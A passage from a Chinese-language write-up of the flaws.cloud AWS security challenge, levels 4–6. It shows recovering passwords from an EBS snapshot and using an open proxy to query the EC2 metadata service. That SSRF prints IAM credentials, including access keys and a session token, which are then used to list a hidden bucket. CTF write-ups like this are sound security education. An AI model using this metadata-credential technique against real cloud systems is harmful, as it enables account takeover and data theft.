run</span><br><span class="line">drwxr-xr-x  2 root root 12288 Feb 13  2017 sbin</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan  3  2017 snap</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jan 13  2017 srv</span><br><span class="line">drwxr-xr-x  2 root root  4096 Feb  5  2016 sys</span><br><span class="line">drwxrwxrwt  8 root root  4096 Feb 28  2017 tmp</span><br><span class="line">drwxr-xr-x 10 root root  4096 Jan 13  2017 usr</span><br><span class="line">drwxr-xr-x 14 root root  4096 Feb 12  2017 var</span><br><span class="line">lrwxrwxrwx  1 root root    29 Feb 22  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-64-generic</span><br><span class="line">lrwxrwxrwx  1 root root    29 Feb 21  2017 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-63-generic</span><br></pre></td></tr></table></figure>
+
+<p>看起来很像一个linux系统，从哪里找到包含认证信息的文件呢？还记得level 4 描述中讲到的“当nginx在EC2上部署后，会创建一个快照”吗？所以nginx是突破点：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ ls -al</span><br><span class="line"></span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x  6 root root 4096 Feb 19  2017 .</span><br><span class="line">drwxr-xr-x 94 root root 4096 Feb 19  2017 ..</span><br><span class="line">-rw-r--r--  1 root root   44 Feb 13  2017 .htpasswd</span><br><span class="line">drwxr-xr-x  2 root root 4096 Oct 27  2016 conf.d</span><br><span class="line">-rw-r--r--  1 root root 1077 Apr 26  2016 fastcgi.conf</span><br><span class="line">-rw-r--r--  1 root root 1007 Apr 26  2016 fastcgi_params</span><br><span class="line">-rw-r--r--  1 root root 2837 Apr 26  2016 koi-utf</span><br><span class="line">-rw-r--r--  1 root root 2223 Apr 26  2016 koi-win</span><br><span class="line">-rw-r--r--  1 root root 3957 Apr 26  2016 mime.types</span><br><span class="line">-rw-r--r--  1 root root 1533 Feb 19  2017 nginx.conf</span><br><span class="line">-rw-r--r--  1 root root  180 Apr 26  2016 proxy_params</span><br><span class="line">-rw-r--r--  1 root root  636 Apr 26  2016 scgi_params</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb 19  2017 sites-available</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb 19  2017 sites-enabled</span><br><span class="line">drwxr-xr-x  2 root root 4096 Feb 12  2017 snippets</span><br><span class="line">-rw-r--r--  1 root root  664 Apr 26  2016 uwsgi_params</span><br><span class="line">-rw-r--r--  1 root root 3071 Apr 26  2016 win-utf</span><br></pre></td></tr></table></figure>
+
+<p><code>.htpasswd</code>文件看起来很可疑：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ cat .htpasswd</span><br><span class="line"></span><br><span class="line">flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0</span><br></pre></td></tr></table></figure>
+
+<p>这应该是一串加密的密码，账户：flaws，密码（加密）：$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0。尝试在<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a>进行登录，没有成功，应该需要明文密码。</p>
+<p>继续寻找可疑的目录和文件，在/home/ubuntu/中发现了一个可疑脚本<code>setupNginx.sh</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ cat setupNginx.sh</span><br><span class="line">htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</span><br></pre></td></tr></table></figure>
+
+<p><code>nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code>应该就是明文密码。尝试登录，成功通关level 4：</p>
+<p><img src="https://p0.ssl.qhimg.com/t01c66ffd1bf052121f.png" srcset="/img/loading.gif"></p>
+<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul>
+<li>在AWS中允许创建EC2的快照，这样做的主要目的是进行备份。但当忘记密码时，能够使用快照来访问EC2实例，而这也恰恰是攻击者感兴趣的地方。</li>
+</ul>
+<h2 id="0x06-Level-5"><a href="#0x06-Level-5" class="headerlink" title="0x06 Level 5"></a>0x06 Level 5</h2><blockquote>
+<p>This EC2 has a simple HTTP only proxy on it. Here are some examples of it’s usage:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</a></li>
+<li><a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml</a></li>
+<li><a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/</a></li>
+</ul>
+<p>See if you can use this proxy to figure out how to list the contents of the level6 bucket at <a target="_blank" rel="noopener" href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/">level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</a> that has a hidden directory in it</p>
+</blockquote>
+<p>在EC2实例上有一个简单的HTTP代理，需要用这个代理，找到level 6存储桶中的隐藏目录。</p>
+<p>尝试直接在浏览器中访问<code>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</code>，得到的结果是<code>Access Denied</code>:</p>
+<p><img src="https://p3.ssl.qhimg.com/t01294894165c74933a.png" srcset="/img/loading.gif"></p>
+<p>level 5 的EC2实例给我们提供了一个代理，目标点应该就在<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/</a> 里面寻找。</p>
+<p>在level 4中，当我寻找可疑目录或者文件时，在/mnt/flaws/home/ubuntu/.bash_history发现了一些有趣的信息:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ cat .bash_history</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">cat setupNginx.sh</span><br><span class="line">curl 169.254.169.254</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data</span><br><span class="line">wget  http://169.254.169.254/latest/meta-data</span><br><span class="line">cat meta-data</span><br><span class="line">curl -XGET http://169.254.169.254/latest/meta-data</span><br><span class="line">wget  http://169.254.169.254/latest/meta-data/iam</span><br><span class="line">cat iam</span><br><span class="line">wget  http://169.254.169.254/latest/meta-data/iam/info</span><br><span class="line">cat info</span><br><span class="line">rm info iam</span><br><span class="line">ls</span><br><span class="line">cat meta-data</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/iam/info</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/profile/</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/profile</span><br><span class="line">curl  http://169.254.169.254/latest/user-data</span><br><span class="line">curl  http://169.254.169.254/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/iam/security-credentials</span><br><span class="line">curl  http://169.254.169.254/iam/security-credentials/flaws/</span><br><span class="line">curl  http://169.254.169.254/iam/</span><br><span class="line">wget http://169.254.169.254/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/meta-data/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws</span><br><span class="line">curl  http://169.254.169.254/latest/meta-data/iam/security-credentials</span><br><span class="line">sudo su -</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>包含<code>169.254.169.254</code>这个IP的几个操作引起了我的注意。<code>169.254.169.254</code>是一个特殊的IP地址，在云服务上（包括AWS），为元数据服务。有关内容可以参见<a target="_blank" rel="noopener" href="https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254">https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254</a> 。</p>
+<p>我们可以用代理来获取自身的元数据，或许能找到一些认证文件或者敏感信息。尝试访问<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/</a> ，得到一堆文件目录：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ami-id</span><br><span class="line">ami-launch-index</span><br><span class="line">ami-manifest-path</span><br><span class="line">block-device-mapping/</span><br><span class="line">events/</span><br><span class="line">hostname</span><br><span class="line">iam/</span><br><span class="line">identity-credentials/</span><br><span class="line">instance-action</span><br><span class="line">instance-id</span><br><span class="line">instance-type</span><br><span class="line">local-hostname</span><br><span class="line">local-ipv4</span><br><span class="line">mac</span><br><span class="line">metrics/</span><br><span class="line">network/</span><br><span class="line">placement/</span><br><span class="line">profile</span><br><span class="line">public-hostname</span><br><span class="line">public-ipv4</span><br><span class="line">public-keys/</span><br><span class="line">reservation-id</span><br><span class="line">security-groups</span><br><span class="line">services/</span><br></pre></td></tr></table></figure>
+
+<p>在里面找寻敏感信息，最终在<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws</a> 找到了泄露出的相关认证信息：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Code&quot; : &quot;Success&quot;,</span><br><span class="line">  &quot;LastUpdated&quot; : &quot;2020-03-22T13:15:35Z&quot;,</span><br><span class="line">  &quot;Type&quot; : &quot;AWS-HMAC&quot;,</span><br><span class="line">  &quot;AccessKeyId&quot; : &quot;ASIA6GG7PSQGTDDQYCXX&quot;,</span><br><span class="line">  &quot;SecretAccessKey&quot; : &quot;GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp&quot;,</span><br><span class="line">  &quot;Token&quot; : &quot;IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=&quot;,</span><br><span class="line">  &quot;Expiration&quot; : &quot;2020-03-22T19:39:11Z&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功获取到一个<code>IAM</code>角色的认证信息。我们将这个认证信息添加到~/.aws/credentials中：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[proxy]</span><br><span class="line">aws_access_key_id = ASIA6GG7PSQGTDDQYCXX</span><br><span class="line">aws_secret_access_key = GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp</span><br><span class="line">aws_session_token = IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=</span><br></pre></td></tr></table></figure>
+
+<p>尝试使用代理访问：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile proxy s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud                                                 </span><br><span class="line">                                   PRE ddcc78ff/                                                                           </span><br><span class="line">        2017-02-27 10:11:07        871 index.html</span><br></pre></td></tr></table></figure>
+
+<p>成功获得权限进入，并找到隐藏目录<code>ddcc78ff/</code>，访问 <a target="_blank" rel="noopener" href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</a> ，这就是level 6 的入口，成功通关level 5。</p>
+<h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><ul>
+<li>IP地址169.254.169.254是云服务中的一个神奇IP，AWS、Azure、谷歌、DigitalOcean等公司都使用它来查找自身的元数据。对于谷歌，对请求有额外的约束，比如要求它使用<code>Metadata-Flavor: Google</code>作为HTTP头，拒绝带有<code>x - forwarding - for</code>头的请求，而在AWS中并没有约束。如果攻击者可以从EC2向该IP发出任何类型的HTTP请求，就很有可能获取到一些敏感信息。这里提供hackerone平台上两篇公开披露的报告用以参考学习：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/53088">https://hackerone.com/reports/53088</a> 、<a target="_blank" rel="noopener" href="https://hackerone.com/reports/53004">https://hackerone.com/reports/53004</a> 。</li>
+</ul>
+<h2 id="0x07-Level-6"><a href="#0x07-Level-6" class="headerlink" title="0x07 Level 6"></a>0x07 Level 6</h2><blockquote>
+<p>For this final challenge, you’re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.</p>
+<p>Access key ID: AKIAJFQ6E7BY57Q3OBGA<br>Secret: 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</p>
+</blockquote>
+<p>最后一关提供了一个附加了安全审计策略的用户的认证信息，看看我们能找到什么有趣的信息。</p>
+<p>首先使用AWS CLI 配置这个用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~$ aws configure --profile flawslevel6</span><br><span class="line">AWS Access Key ID [None]: AKIAJFQ6E7BY57Q3OBGA</span><br><span class="line">AWS Secret Access Key [None]: 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</span><br><span class="line">Default region name [None]: us-west-2</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure>
+
+<p>在<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html#jf_security-auditor">AWS的文档</a>中，对<code>SecurityAudit </code>这样描述：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/SecurityAudit">SecurityAudit</a></p>
+<p><strong>Use case:</strong> This user monitors accounts for compliance with security requirements. This user can access logs and events to investigate potential security breaches or potential malicious activity.</p>
+<p><strong>Policy description:</strong> This policy grants permissions to view configuration data for many AWS services and to review their logs.</p>
+</blockquote>
+<p>意思就是说：该用户可以访问日志和事件来调查潜在的安全漏洞或潜在的恶意活动，被授予查看一些AWS服务的配置数据和查看其日志的权限。</p>
+<p>在level 3 中，我们查看到了S3存储桶中包含的内容：</p>
+<p><img src="https://p1.ssl.qhimg.com/t01b7bbaeca18c15902.png" srcset="/img/loading.gif"></p>
+<p>尝试访问<code>flaws-logs</code>，结果没有权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls s3://flaws-logs --profile flawslevel6</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span><br></pre></td></tr></table></figure>
+
+<p>该政策可能涉及到的其他AWS服务包括<code>CloudTrail</code>和<code>CloudWatch</code>，继续尝试访问：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~$ aws cloudtrail describe-trails --profile flawslevel6</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;trailList&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;IncludeGlobalServiceEvents&quot;: true,</span><br><span class="line">            &quot;IsOrganizationTrail&quot;: true,</span><br><span class="line">            &quot;Name&quot;: &quot;summitroute-logs&quot;,</span><br><span class="line">            &quot;TrailARN&quot;: &quot;arn:aws:cloudtrail:us-east-1:763647780161:trail/summitroute-logs&quot;,</span><br><span class="line">            &quot;LogFileValidationEnabled&quot;: true,</span><br><span class="line">            &quot;IsMultiRegionTrail&quot;: true,</span><br><span class="line">            &quot;HasCustomEventSelectors&quot;: false,</span><br><span class="line">            &quot;S3BucketName&quot;: &quot;summitroute-logs&quot;,</span><br><span class="line">            &quot;HasInsightSelectors&quot;: false,</span><br><span class="line">            &quot;HomeRegion&quot;: &quot;us-east-1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>CloudTrail</code>服务是开启的，那么尝试查看<code>CloudTrail</code>的事件，结果没有权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ aws cloudtrail lookup-events --profile flawslevel6</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDeniedException) when calling the LookupEvents operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: cloudtrail:LookupEvents</span><br></pre></td></tr></table></figure>
+
+<p>转换思路，查看此用户的相关信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam get-user</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;User&quot;: &#123;</span><br><span class="line">        &quot;UserName&quot;: &quot;Level6&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-26T23:11:16Z&quot;,</span><br><span class="line">        &quot;UserId&quot;: &quot;AIDAIRMDOSCWGLCDWOG6A&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:user/Level6&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>UserName</code>为<code>Level6</code>，继续查看这个用户的附加策略：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam list-attached-user-policies --user-name Level6</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;AttachedPolicies&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;PolicyName&quot;: &quot;list_apigateways&quot;,</span><br><span class="line">            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;PolicyName&quot;: &quot;MySecurityAudit&quot;,</span><br><span class="line">            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/MySecurityAudit&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现附加了<code>list_apigateways</code>的策略，更详细的查看这个策略：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigat eways</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &#123;</span><br><span class="line">        &quot;PolicyName&quot;: &quot;list_apigateways&quot;,</span><br><span class="line">        &quot;Description&quot;: &quot;List apigateways&quot;,</span><br><span class="line">        &quot;PermissionsBoundaryUsageCount&quot;: 0,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-20T01:45:17Z&quot;,</span><br><span class="line">        &quot;AttachmentCount&quot;: 1,</span><br><span class="line">        &quot;IsAttachable&quot;: true,</span><br><span class="line">        &quot;PolicyId&quot;: &quot;ANPAIRLWTQMGKCSPGTAIO&quot;,</span><br><span class="line">        &quot;DefaultVersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;,</span><br><span class="line">        &quot;UpdateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们得到了这个策略的<code>Arn</code>和<code>DefaultVersionId</code>，能够进一步详细查看：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list _apigateways --version-id v4</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;PolicyVersion&quot;: &#123;</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;,</span><br><span class="line">        &quot;VersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;Document&quot;: &#123;</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Action&quot;: [</span><br><span class="line">                        &quot;apigateway:GET&quot;</span><br><span class="line">                    ],</span><br><span class="line">                    &quot;Resource&quot;: &quot;arn:aws:apigateway:us-west-2::/restapis/*&quot;,</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;IsDefaultVersion&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
